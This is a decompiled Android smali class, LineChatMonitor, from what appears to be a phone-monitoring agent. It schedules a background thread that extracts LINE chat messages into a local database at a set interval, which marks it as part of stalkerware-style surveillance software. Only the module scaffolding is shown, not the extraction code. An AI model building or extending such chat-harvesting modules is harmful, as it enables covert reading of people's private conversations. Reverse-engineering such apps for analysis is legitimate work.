.class public Lcom/hp/vd/module/monitor/LineChatMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "LineChatMonitor.java"


# static fields
.field public static final ATTRIBUTE_MAX_ID:Ljava/lang/String; = "ln_max_id"

.field public static final ATTRIBUTE_MAX_MESSAGE_LENGTH:Ljava/lang/String; = "max_length"

.field public static final ATTRIBUTE_MAX_READ_MESSAGE_PER_ITERATION:Ljava/lang/String; = "300"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field protected static final TAG:Ljava/lang/String; = "LnChatMon"


# instance fields
.field protected extractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected lineChatDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/LineChatData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 20
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    .line 112
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 113
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 38
    const-class v0, Lcom/hp/vd/data/LineChatData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 55
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 57
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 58
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 59
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 60
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x2

    .line 61
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v2.0"

    .line 62
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 64
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "synchronization_interval"

    const-string v2, "3499"

    .line 68
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_length"

    const-string v2, "1024"

    .line 69
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x18

    .line 71
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 72
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 74
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "LineChatMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 186
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 187
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 188
    iget-object v2, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 190
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 194
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 4

    .line 82
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 85
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    .line 94
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "LnChatMon"

    const-string v3, "initialize(): could not load persisted module data."

    .line 97
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v1

    const-string v2, "LnChatMon"

    const-string v3, "Could not create Dao."

    .line 88
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 0

    .line 44
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0xc8

    .line 48
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/LineChatMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 177
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 181
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    return v0
.end method

.method public start()Z
    .locals 6

    .line 132
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "LnChatMon"

    const-string v2, "start() called."

    .line 133
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 135
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->isActivated()Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "LnChatMon"

    const-string v3, "start(): This module is currently DEactivated."

    .line 136
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 141
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->hasUpdateIntervalExpired()Z

    move-result v1

    const/4 v3, 0x1

    if-ne v1, v3, :cond_1

    return v3

    .line 145
    :cond_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v1, "LnChatMon"

    const-string v4, "start(): Extractor thread is currently running. Exiting..."

    .line 146
    invoke-interface {v0, v1, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 151
    :cond_2
    new-instance v1, Lcom/hp/vd/module/monitor/line/LineChatExtractor;

    .line 152
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v4, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-direct {v1, v2, v4, v5, v0}, Lcom/hp/vd/module/monitor/line/LineChatExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 158
    new-instance v0, Ljava/lang/Thread;

    const-string v2, "Line-Chat-Extractor-Thread"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    .line 159
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return v3
.end method

.method public startOnHeartbeat()Z
    .locals 1

    .line 122
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LineChatMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    .line 167
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 168
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LineChatMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_0
    const/4 v0, 0x1

    return v0
.end method
